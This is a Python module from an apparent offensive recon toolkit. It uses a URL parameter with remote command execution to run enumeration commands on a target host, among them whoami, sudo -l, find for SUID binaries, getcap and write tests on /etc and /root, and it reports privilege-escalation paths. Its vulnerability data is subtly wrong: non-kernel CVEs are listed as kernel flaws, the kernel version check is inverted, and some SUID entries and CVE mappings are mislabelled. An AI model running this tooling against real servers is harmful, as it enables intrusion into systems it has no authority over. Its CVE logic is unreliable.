"""
modules/privilege_escalation.py - Privilege escalation detection and exploitation
Detect kernel vulnerabilities, sudo misconfigurations, and escalation paths
"""

import json
import logging
import re
from typing import Dict, List, Any, Optional, Callable

from core.http_engine import HTTPClient
from core.executor import run_command, tool_available

logger = logging.getLogger("recon.privesc")


class PrivilegeEscalation:
    """Privilege escalation detection and exploitation engine"""
    
    def __init__(self, output_dir: str, timeout: int = 30):
        self.output_dir = output_dir
        self.timeout = timeout
        self.http_client = HTTPClient(timeout=timeout)
        self.findings_file = f"{output_dir}/privesc_findings.json"
    
    def check_escalation(
        self,
        url: str,
        rce_command: Optional[str] = None,
        progress_cb: Optional[Callable[[str, str, str], None]] = None
    ) -> Dict[str, Any]:
        """
        Check for privilege escalation vectors
        
        Args:
            url: Target URL with RCE
            rce_command: Command to use for remote execution (e.g., 'cmd' or 'command')
            progress_cb: Progress callback
            
        Returns:
            Dict with escalation findings
        """
        result = {
            'url': url,
            'tool': 'privilege_escalation',
            'type': 'privesc_vectors',
            'kernel_vulns': [],
            'sudo_issues': [],
            'suid_files': [],
            'writable_paths': [],
            'capabilities': [],
            'escalation_chains': []
        }
        
        if progress_cb:
            progress_cb('privesc', 'privilege_escalation', 'Checking privilege escalation vectors...')
        
        logger.info(f"[PRIVESC] Checking escalation on {url}")
        
        if rce_command:
            # Remote privilege escalation check
            logger.info(f"[PRIVESC] Using RCE parameter: {rce_command}")
            
            # Check current user
            current_user = self._exec_remote_command(url, rce_command, 'whoami')
            if current_user:
                logger.info(f"[PRIVESC] Current user: {current_user}")
                
                # Check if already root
                if 'root' in current_user.lower():
                    result['escalation_chains'].append({
                        'chain': 'Already root',
                        'user': current_user,
                        'success': True
                    })
                    return result
            
            # Check kernel version
            kernel_info = self._exec_remote_command(url, rce_command, 'uname -r')
            if kernel_info:
                kernel_vulns = self._check_kernel_vulns(kernel_info)
                result['kernel_vulns'] = kernel_vulns
                if progress_cb:
                    progress_cb('privesc', 'privilege_escalation', f'Found {len(kernel_vulns)} kernel vulns')
            
            # Check sudo permissions
            sudo_vulns = self._check_sudo_perms(url, rce_command)
            result['sudo_issues'] = sudo_vulns
            
            # Check SUID binaries
            suid = self._check_suid_binaries(url, rce_command)
            result['suid_files'] = suid
            
            # Check writable paths
            writable = self._check_writable_paths(url, rce_command)
            result['writable_paths'] = writable
            
            # Check capabilities
            caps = self._check_capabilities(url, rce_command)
            result['capabilities'] = caps
        
        else:
            # Local checks using local tools
            if tool_available('linenum'):
                local_vulns = self._run_linenum()
                result['kernel_vulns'] = local_vulns['kernel_vulns']
                result['sudo_issues'] = local_vulns['sudo_issues']
                result['suid_files'] = local_vulns['suid_files']
        
        # Save findings
        try:
            with open(self.findings_file, 'w') as f:
                json.dump(result, f, indent=2)
        except Exception as e:
            logger.error(f"[PRIVESC] Error saving findings: {e}")
        
        if progress_cb:
            total_chains = len(result['escalation_chains'])
            progress_cb('privesc', 'privilege_escalation', f'Completed: {total_chains} chains identified')
        
        return result
    
    def _exec_remote_command(self, url: str, param: str, command: str) -> Optional[str]:
        """Execute command remotely via RCE"""
        try:
            test_url = f"{url}?{param}={command.replace(' ', '%20')}"
            resp = self.http_client.get(test_url, timeout=5)
            if resp.status_code == 200:
                return resp.text.strip()
        except Exception as e:
            logger.debug(f"[PRIVESC] Remote command failed: {e}")
        
        return None
    
    def _check_kernel_vulns(self, kernel_version: str) -> List[Dict]:
        """Check for known kernel vulnerabilities"""
        vulns = []
        
        # Extract version number
        match = re.search(r'(\d+\.\d+\.\d+)', kernel_version)
        if not match:
            return vulns
        
        kernel = match.group(1)
        major, minor, patch = map(int, kernel.split('.'))
        
        # Known kernel vulnerabilities
        kernel_cves = {
            'CVE-2021-22555': {'version': (5, 8), 'name': 'Netfilter overflow'},
            'CVE-2021-4034': {'version': (5, 10), 'name': 'PwnKit (pkexec)'},
            'CVE-2022-0847': {'version': (5, 16), 'name': 'Dirty Pipe'},
            'CVE-2022-24765': {'version': (5, 17), 'name': 'Git privilege escalation'},
            'CVE-2022-2586': {'version': (5, 19), 'name': 'io_uring'},
            'CVE-2023-0386': {'version': (6, 0), 'name': 'OverlayFS'}
        }
        
        for cve, info in kernel_cves.items():
            cve_major, cve_minor = info['version']
            if major > cve_major or (major == cve_major and minor >= cve_minor):
                vulns.append({
                    'cve': cve,
                    'name': info['name'],
                    'kernel_version': kernel,
                    'applicable': True
                })
                logger.info(f"[PRIVESC] Found applicable kernel CVE: {cve}")
        
        return vulns
    
    def _check_sudo_perms(self, url: str, param: str) -> List[Dict]:
        """Check for sudo permission vulnerabilities"""
        issues = []
        
        # Check sudo -l (list sudo permissions)
        output = self._exec_remote_command(url, param, 'sudo -l 2>/dev/null')
        if not output:
            return issues
        
        # Parse sudo output
        if 'NOPASSWD' in output:
            issues.append({
                'type': 'NOPASSWD',
                'description': 'Sudo command without password',
                'severity': 'high',
                'details': output[:200]
            })
            logger.info(f"[PRIVESC] Found NOPASSWD in sudo perms")
        
        if '(ALL)' in output:
            issues.append({
                'type': 'ALL_COMMANDS',
                'description': 'Sudo access to all commands',
                'severity': 'critical',
                'details': output[:200]
            })
            logger.info(f"[PRIVESC] Found (ALL) in sudo perms")
        
        # Check for vulnerable sudo versions
        sudo_version = self._exec_remote_command(url, param, 'sudo --version')
        if sudo_version:
            # CVE-2021-3156 heapspray in sudo <= 1.9.5
            if re.search(r'1\.[0-8]\.|1\.9\.[0-5]', sudo_version):
                issues.append({
                    'type': 'SUDO_HEAP_VUL',
                    'cve': 'CVE-2021-3156',
                    'description': 'Heap-based buffer overflow in sudo',
                    'severity': 'critical',
                    'version': sudo_version
                })
                logger.info(f"[PRIVESC] Found vulnerable sudo version")
        
        return issues
    
    def _check_suid_binaries(self, url: str, param: str) -> List[Dict]:
        """Check for exploitable SUID binaries"""
        suid_files = []
        
        # Get SUID binaries
        output = self._exec_remote_command(url, param, 'find / -perm -4000 2>/dev/null')
        if not output:
            return suid_files
        
        # Common exploitable SUID binaries
        exploitable = {
            'nmap': 'CVE-2008-4109',
            'openssh-keysign': 'SSH key handling',
            'cpulimit': 'Process limit bypass',
            'screen': 'Screen session hijacking',
            'bypasswd': 'Password bypass'
        }
        
        for binary, exploit in exploitable.items():
            if binary in output:
                suid_files.append({
                    'binary': binary,
                    'exploit': exploit,
                    'type': 'SUID',
                    'severity': 'high'
                })
                logger.info(f"[PRIVESC] Found exploitable SUID: {binary}")
        
        return suid_files[:10]  # Limit results
    
    def _check_writable_paths(self, url: str, param: str) -> List[Dict]:
        """Check for writable system paths"""
        writable = []
        
        critical_paths = [
            '/etc',
            '/root',
            '/var/www',
            '/home',
            '/tmp',
            '/var/tmp',
            '/dev/shm'
        ]
        
        for path in critical_paths:
            result = self._exec_remote_command(url, param, f'test -w {path} && echo "writable"')
            if result and 'writable' in result:
                writable.append({
                    'path': path,
                    'writable': True,
                    'severity': 'high' if path.startswith('/') and path != '/tmp' else 'medium'
                })
                logger.info(f"[PRIVESC] Found writable path: {path}")
        
        return writable
    
    def _check_capabilities(self, url: str, param: str) -> List[Dict]:
        """Check for dangerous process capabilities"""
        caps = []
        
        # Get capabilities
        output = self._exec_remote_command(url, param, 'getcap -r / 2>/dev/null')
        if not output:
            return caps
        
        # Parse capabilities
        dangerous_caps = ['CAP_SYS_ADMIN', 'CAP_NET_ADMIN', 'CAP_SYS_PTRACE', 'CAP_SYS_MODULE']
        
        for cap in dangerous_caps:
            if cap in output:
                caps.append({
                    'capability': cap,
                    'description': f'Process has {cap}',
                    'severity': 'high'
                })
                logger.info(f"[PRIVESC] Found dangerous capability: {cap}")
        
        return caps
    
    def _run_linenum(self) -> Dict:
        """Run linEnum for local privilege escalation checks"""
        result = {
            'kernel_vulns': [],
            'sudo_issues': [],
            'suid_files': []
        }
        
        try:
            ret, out, err = run_command('bash linenum.sh', timeout=60)
            if ret == 0:
                # Parse linEnum output
                # This would require parsing linEnum output format
                pass
        except Exception as e:
            logger.debug(f"[PRIVESC] linEnum error: {e}")
        
        return result
